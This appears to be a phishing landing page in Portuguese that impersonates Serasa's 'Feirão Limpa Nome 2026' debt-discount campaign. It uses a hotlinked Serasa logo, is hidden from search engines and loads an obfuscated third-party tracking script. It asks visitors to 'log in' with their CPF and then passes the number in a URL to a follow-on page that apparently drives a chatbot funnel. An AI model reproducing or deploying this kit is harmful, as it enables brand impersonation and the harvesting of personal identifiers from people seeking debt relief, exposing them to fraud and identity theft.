<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script src="https://cdn.xtracky.com/scripts/experimental.obfuscated.js" data-token="ba374c9e-0020-4dce-b1fd-cac80baab7d0" data-click-id-param="click_id"></script>
    <meta charset="utf-8">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Serasa | Feirão Limpa Nome 2026</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <style type="text/css">
        :root {
            --color-primary: #e63888; 
            --color-secondary: #004481; 
            --color-tertiary: #FFFFFF;
            --color-text: #4d4d4d;
            --font-primary: 'Montserrat', sans-serif;
            --border-radius: 8px;
            --box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: var(--font-primary);
            background: linear-gradient(135deg, #e63888 0%, #fb58a7 100%);
            color: var(--color-text);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        #template-wrapper {
            background-color: var(--color-tertiary);
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            width: 100%;
            max-width: 450px;
            overflow: hidden;
            padding: 40px 30px;
        }
        
        #template-header { text-align: center; margin-bottom: 25px; }
        #template-logo { height: 60px; margin-bottom: 10px; object-fit: contain; }
        
        .title { color: var(--color-primary); font-size: 1.5rem; font-weight: 700; text-align: center; }
        .subtitle { color: var(--color-secondary); font-size: 1.4rem; font-weight: 800; text-align: center; margin-bottom: 20px; display: block; }
        .description { color: #666; font-size: 0.95rem; text-align: center; margin-bottom: 30px; }
        
        .float-label-group { margin-bottom: 25px; position: relative; }
        .float-label input {
            width: 100%;
            padding: 18px 15px;
            border: 1px solid #ccc;
            border-radius: var(--border-radius);
            font-size: 1.1rem;
            outline: none;
        }
        .float-label input:focus { border-color: var(--color-primary); }
        .float-label label {
            position: absolute;
            top: -10px; left: 12px;
            background-color: white;
            padding: 0 8px;
            font-size: 0.85rem;
            color: var(--color-primary);
            font-weight: 600;
        }
        
        .button-primary {
            width: 100%;
            padding: 16px;
            background-color: var(--color-secondary);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-weight: 700;
            font-size: 1.05rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--color-primary);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 15px auto 0;
        }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>

<body>
    <div id="template-wrapper">
        <header id="template-header">
            <img alt="Serasa" id="template-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcReczvsW7A8dkbBlPTpdhRBZIzf9gSOoyiQoQ&s">
        </header>

        <section>
            <h4 class="title">Feirão Limpa Nome</h4>
            <span class="subtitle">2026</span>
            <p class="description">O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto.</p>

            <form id="cpfForm">
                <div class="float-label-group">
                    <div class="float-label">
                        <input type="tel" id="cpf" maxlength="14" placeholder="000.000.000-00" required>
                        <label for="cpf"><i class="far fa-id-card"></i> CPF</label>
                    </div>
                </div>
                <button type="submit" id="verificarBtn" class="button-primary">Verificar meus descontos</button>
            </form>
            <div id="loader" class="loader"></div>
        </section>
    </div>

    <script>
        // Máscara visual do CPF
        document.getElementById('cpf').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 11) v = v.slice(0, 11);
            v = v.replace(/(\d{3})(\d)/, '$1.$2');
            v = v.replace(/(\d{3})(\d)/, '$1.$2');
            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = v;
        });

        document.getElementById('cpfForm').addEventListener('submit', function(e) {
            e.preventDefault();
            // LIMPEZA CRÍTICA: Envia apenas os números para evitar erro no Typebot
            const cpfNumeros = document.getElementById('cpf').value.replace(/\D/g, '');
            
            if (cpfNumeros.length === 11) {
                document.getElementById('verificarBtn').disabled = true;
                document.getElementById('loader').style.display = 'block';

                // Redireciona enviando o CPF limpo via URL
                setTimeout(() => {
                    window.location.href = `./aproveite/index.html?cpf=${cpfNumeros}`;
                }, 500);
            } else {
                alert("Digite o CPF completo.");
            }
        });
    </script>
</body>
</html>
